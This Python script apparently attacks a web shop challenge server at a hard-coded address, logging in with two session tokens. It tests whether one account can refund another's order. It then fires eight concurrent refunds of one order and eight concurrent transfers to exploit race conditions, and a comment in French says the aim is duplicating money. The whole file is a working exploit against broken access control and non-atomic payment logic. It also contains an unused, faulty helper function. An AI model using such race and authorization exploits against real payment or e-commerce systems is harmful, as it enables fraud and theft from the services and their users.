import requests, threading, time
B="http://13.37.197.230:28493"
def J(r):
    try: return r.json()
    except: return f"{r.status_code}:{r.text[:80]}"
def sess(tok):
    s=requests.Session(); s.post(B+"/api/join",json={"token":tok},timeout=8); return s
def me(s): return J(s.get(B+"/api/me",timeout=8))
A=sess("842d0f131b6b020f")   # acct1 T015739
Bs=sess("290a8731c89d6d26")  # acct2 T015747
print("A:",me(A)); print("B:",me(Bs))

print("\n== TEST 1: cross-account refund (A refunds B's order) ==")
o=J(Bs.post(B+"/api/buy",json={"product":"booster","qty":1},timeout=8)); print("B buys:",o)
oid=o.get("order_id")
print("A refunds B's order",oid,"->",J(A.post(B+"/api/refund",json={"order_id":oid},timeout=8)))
print("A:",me(A)); print("B:",me(Bs))

print("\n== TEST 2: concurrent double-refund of ONE order (race) ==")
o=J(A.post(B+"/api/buy",json={"product":"vip","qty":1},timeout=8)); print("A buys vip:",o)
oid=o.get("order_id")
res=[];
def refund():
    try: res.append(J(requests.Session().__class__.post(A,B+"/api/refund",json={"order_id":oid},timeout=8)))
    except Exception as e: res.append(str(e))
# use the SAME authenticated session A from multiple threads
before=me(A)
ths=[]
def rf():
    r=A.post(B+"/api/refund",json={"order_id":oid},timeout=8); res.append(J(r))
for _ in range(8): ths.append(threading.Thread(target=rf))
for t in ths: t.start()
for t in ths: t.join()
print("refund results:",res)
print("A before:",before["wallet"],"after:",me(A)["wallet"])

print("\n== TEST 3: concurrent double-transfer (race) ==")
# make sure A has some balance; transfer 5000 x many concurrently to B
amt=5000; N=8
beforeA=me(A)["wallet"]; beforeB=me(Bs)["wallet"]
res2=[]
def tf():
    r=A.post(B+"/api/transfer",json={"to_code":me(Bs)["code"] if False else "T015747","montant":amt},timeout=8); res2.append(J(r))
ths=[threading.Thread(target=tf) for _ in range(N)]
for t in ths: t.start()
for t in ths: t.join()
okc=sum(1 for x in res2 if isinstance(x,dict) and x.get("ok"))
afterA=me(A)["wallet"]; afterB=me(Bs)["wallet"]
print(f"transfer ok={okc}/{N}  A: {beforeA}->{afterA} (d={afterA-beforeA})  B: {beforeB}->{afterB} (d={afterB-beforeB})")
print("  -> si |dA| < dB : duplication d'argent via race")
